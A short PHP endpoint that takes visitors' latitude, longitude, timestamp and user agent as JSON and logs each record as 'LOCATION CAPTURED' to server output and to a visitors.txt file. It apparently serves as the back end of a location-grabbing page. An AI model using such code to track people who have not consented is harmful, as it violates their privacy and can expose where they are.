<?php
// Receive the JSON data
$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

if ($data) {
    // 1. Create a readable string
    $logEntry = ">>> LOCATION CAPTURED: Lat: " . $data['lat'] . " | Lon: " . $data['lon'] . " | Time: " . $data['time'] . " | UA: " . $data['ua'];

    // 2. FORCE output to Render Dashboard Logs
    $out = fopen('php://stdout', 'w');
    fputs($out, $logEntry . PHP_EOL);
    fclose($out);

    // 3. Optional: Still try to save to file for the session
    file_put_contents('visitors.txt', $logEntry . PHP_EOL, FILE_APPEND);
    
    echo "Success";
} else {
    // This helps you see in logs if the script was even hit
    $err = fopen('php://stderr', 'w');
    fputs($err, "ERROR: No data received in log_location.php" . PHP_EOL);
    fclose($err);
}
?>
